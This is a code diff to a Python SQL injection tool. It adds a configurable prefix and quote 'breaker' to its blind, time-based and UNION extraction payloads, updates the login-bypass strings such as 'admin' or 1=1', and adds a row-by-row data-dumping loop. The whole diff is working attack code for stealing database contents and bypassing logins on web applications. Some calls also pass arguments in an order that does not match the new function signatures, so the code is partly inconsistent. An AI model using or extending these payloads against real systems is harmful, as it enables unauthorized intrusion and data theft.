@@ -33,7 +33,7 @@ def check_url(url, payload):
 
     get_data, post_data, cookies, headers = build_payload(payload)
 
-    print(get_data, post_data, cookies, headers)
+    #print(get_data, post_data, cookies, headers)
 
 
     if CONF['method'] == 'POST':
@@ -59,14 +59,14 @@ def check_result(result):
     return check
 
 
-def blind_extract(url,data_length=20, charset=string.printable):
+def blind_extract(url, val, data_length=20, charset=string.printable):
     data_found = ''
 
     for idx in range(1, data_length + 1):
 
         for char in charset:
 
-            result = check_url(url, f" AND SUBSTRING({CONF['column']}, {idx}, 1) = '{char}'")
+            result = check_url(url, f"{val}{CONF['breaker']} AND SUBSTRING({CONF['column']}, {idx}, 1) = '{char}'")
             check = check_result(result)
 
             if check:
@@ -76,11 +76,11 @@ def blind_extract(url,data_length=20, charset=string.printable):
     return data_found
 
 
-def blind_data_length(url):
+def blind_data_length(url, val):
     data_length = 0
 
     while True:
-        result = check_url(url, f" AND length({CONF['column']}) >= {data_length + 1}-- -")
+        result = check_url(url, f"{val}{CONF['breaker']} AND length({CONF['column']}) >= {data_length + 1}-- -")
         check = check_result(result)
 
         if check:
@@ -91,11 +91,11 @@ def blind_data_length(url):
     return data_length
 
 
-def union_nb_columns(url):
+def union_nb_columns(url, val):
     nb_columns = 0
 
     while True:
-        result = check_url(url, f" ORDER BY {nb_columns+1}-- -")
+        result = check_url(url, f"{val}{CONF['breaker']} ORDER BY {nb_columns+1}-- -")
         check = check_result(result)
 
         if check:
@@ -106,12 +106,12 @@ def union_nb_columns(url):
     return nb_columns
 
 
-def union_readable_column(url, nb_columns):
+def union_readable_column(url, nb_columns, val):
 
     tab_fields = [str(x) * 10 for x in range(nb_columns)]
     fields = ','.join(tab_fields)
 
-    result = check_url(url, f"UNION SELECT {fields} FROM {CONF['table']} LIMIT 0,1-- -")
+    result = check_url(url, f"{val}{CONF['breaker']} UNION SELECT {fields} FROM {CONF['table']} LIMIT 0,1-- -")
     check = check_result(result)
     
     if check:
@@ -121,7 +121,7 @@ def union_readable_column(url, nb_columns):
 
     return -1
 
-def union_extract(url, nb_columns, idx_column=0, limit_start=0, limit_count=500):
+def union_extract(url, nb_columns, val, idx_column=0, limit_start=0, limit_count=500):
     data_found = ''
 
     column = CONF['column'].split(',')
@@ -131,7 +131,7 @@ def union_extract(url, nb_columns, idx_column=0, limit_start=0, limit_count=500)
     column = f"CONCAT(0x{sep_line},{(',0x'+sep_col+',').join(column)},0x{sep_line})"
     fields = ('1,' * idx_column) + column + (',1' * (nb_columns-1-idx_column))
 
-    result = check_url(url, f" UNION SELECT {fields} FROM {CONF['table']} LIMIT {limit_start}, {limit_count}-- -")
+    result = check_url(url, f"{val}{CONF['breaker']} UNION SELECT {fields} FROM {CONF['table']} LIMIT {limit_start}, {limit_count}-- -")
     check = check_result(result)
 
     tab_final = []
@@ -147,7 +147,7 @@ def union_extract(url, nb_columns, idx_column=0, limit_start=0, limit_count=500)
     return tab_final
 
 
-def time_extract(url, data_length=20, charset=string.printable):
+def time_extract(url, val, data_length=20, charset=string.printable):
     data_found = ''
 
     for idx in range(1, data_length + 1):
@@ -155,7 +155,7 @@ def time_extract(url, data_length=20, charset=string.printable):
 
             start_time = time.time()
 
-            result = check_url(url, f" AND IF (SUBSTRING({CONF['column']}, {idx}, 1) = '{char}', sleep({CONF['time_delay']}), 'false')-- -")
+            result = check_url(url, f"{val}{CONF['breaker']} AND IF (SUBSTRING({CONF['column']}, {idx}, 1) = '{char}', sleep({CONF['time_delay']}), 'false')-- -")
             #check = check_result(result)
 
             if (time.time() - start_time) >= CONF['time_delay']:
@@ -166,14 +166,14 @@ def time_extract(url, data_length=20, charset=string.printable):
 
 
 
-def time_data_length(url):
+def time_data_length(url, val):
     data_length = 0
 
     while True:
 
         start_time = time.time()
 
-        result = check_url(url, f" AND IF (length({CONF['column']}) = {data_length}, sleep({CONF['time_delay']}), 'false')-- -")
+        result = check_url(url, f"{val}{CONF['breaker']} AND IF (length({CONF['column']}) = {data_length}, sleep({CONF['time_delay']}), 'false')-- -")
         #check = check_result(result)
 
         if (time.time() - start_time) >= CONF['time_delay']:
@@ -205,8 +205,10 @@ parser.add_argument('-e', '--error', metavar='MSG ERROR', help='Error string to 
 args, leftovers = parser.parse_known_args()
 
 
-list_bypass = ["admin'-- -", "admin' and 1=1-- -", "admin' or 1=1 limit 1"]
 
+
+CONF['breaker'] = "" #"'"
+CONF['bad_value'] = '-1'
 CONF['sep_col'] = '|||'
 CONF['sep_line'] = '%%%'
 CONF['delay_request'] = 0.05
@@ -222,6 +224,7 @@ CONF['method'] = args.method.upper()
 CONF['get_data'] = args.get_data
 CONF['post_data'] = args.post_data
 
+list_bypass = ["admin"+ CONF['breaker'] +"-- -", "admin"+ CONF['breaker'] +" and 1=1-- -", "admin"+ CONF['breaker'] +" or 1=1 limit 1"]
 
 if args.cookies:
     for c in args.cookies:
@@ -247,30 +250,38 @@ print("[+] URL :", url)
 if args.action == 'login':
 
     for bypass in list_bypass:
-        result = check_url(url, bypass)
+        result = check_url(url, bypass, '')
         check = check_result(result)
 
         if check:
             print("Bypass works with payload", bypass)
 
 elif args.action == 'blind':
-    data_length = blind_data_length(url)
+    data_length = blind_data_length(url, CONF['value'])
     print("Found length :", data_length)
-    data_found = blind_extract(url,data_length)
+    data_found = blind_extract(url,data_length, CONF['value'])
     print("Found data :", data_found)
 
 elif args.action == 'union':
-    nb_columns = union_nb_columns(url)
+    nb_columns = union_nb_columns(url, CONF['value'])
     print("Found nb columns :", nb_columns)
-    idx_column = union_readable_column(url, nb_columns)
+    idx_column = union_readable_column(url, nb_columns, CONF['bad_value'])
     print("Found readable column :", idx_column+1)
-    data_found = union_extract(url, nb_columns, idx_column)
+    data_found = union_extract(url, nb_columns, CONF['bad_value'], idx_column)
     print("Found data :", data_found)
 
+    if len(data_found) == 1:
+        x = 1
+        while len(data_found) > 0:
+            data_found = union_extract(url, nb_columns, CONF['bad_value'], idx_column, limit_start=x, limit_count=1)
+            x += 1
+            print(data_found)
+
+
 elif args.action == 'time':
-    data_length = time_data_length(url)
+    data_length = time_data_length(url, CONF['value'])
     print("Found length :", data_length)
-    data_found = time_extract(url,data_length)
+    data_found = time_extract(url,data_length, CONF['value'])
     print("Found data :", data_found)
 
 
